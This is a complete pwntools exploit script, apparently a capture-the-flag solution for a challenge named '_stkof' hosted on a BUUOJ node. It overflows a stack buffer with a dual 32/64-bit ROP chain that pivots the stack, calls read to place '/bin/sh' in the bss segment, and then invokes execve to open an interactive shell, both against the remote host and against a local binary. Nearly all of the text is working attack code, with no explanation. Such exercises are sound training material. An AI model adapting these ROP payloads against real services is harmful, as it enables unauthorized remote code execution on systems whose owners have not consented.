from pwn import *

io=remote('node3.buuoj.cn',28947)

int_0x80_addr = 0x080495a3
bss = 0x080DAFC4
pop_dx_cx_bx_ret = 0x0806e9f1
pop_edi_ret=0x08049b1b
pop_rax_ret = 0x080a8af6
read=0x0806C8E0
syscall = 0x0000000000461645
bss_64_addr = 0x6a4e40
pop_rdi_64_ret = 0x4005f6
pop_rsi_64_ret = 0x405895
pop_rdx_64_ret = 0x43b9d5
pop_rax_64_ret = 0x43b97c
add_64_80sp_ret = 0x40cd17
add_32_20sp_ret = 0x080a69f2
pay='A'*0x110
pay+=p32(add_32_20sp_ret)
pay+='A'*4
pay+=p64(add_64_80sp_ret)
pay+='A'*0x14
pay+=p32(read) 
pay+=p32(pop_dx_cx_bx_ret) 
pay+=p32(0) 
pay+=p32(bss) 
pay+=p32(0x8)  
pay+=p32(pop_rax_ret) 
pay+=p32(0xb) 
pay+=p32(pop_dx_cx_bx_ret) 
pay+=p32(0)  
pay+=p32(0) 
pay+=p32(bss)
pay+=p32(int_0x80_addr)
pay+='A'*0x3c
pay+=p64(pop_rdi_64_ret) 
pay+=p64(0x0) 
pay+=p64(pop_rsi_64_ret) 
pay+=p64(bss_64_addr) 
pay+=p64(pop_rdx_64_ret) 
pay+=p64(0x20) 
pay+=p64(pop_rax_64_ret) 
pay+=p64(0) 
pay+=p64(syscall) 
pay+=p64(pop_rax_64_ret) 
pay+=p64(0) 
pay+=p64(pop_rsi_64_ret) 
pay+=p64(0x0) 
pay+=p64(pop_rdx_64_ret) 
pay+=p64(0x0) 
pay+=p64(pop_rax_64_ret) 
pay+=p64(59) 
pay+=p64(pop_rdi_64_ret) 
pay+=p64(bss_64_addr) 
pay+=p64(syscall)
io.recv()
io.sendline(pay)
io.recv()
io.send('/bin/sh\x00')

io.interactive()
io.close()
io = process('./_stkof')
io.recv()
io.sendline(pay)
io.recv()
io.send('/bin/sh\x00')

io.interactive()
io.close()
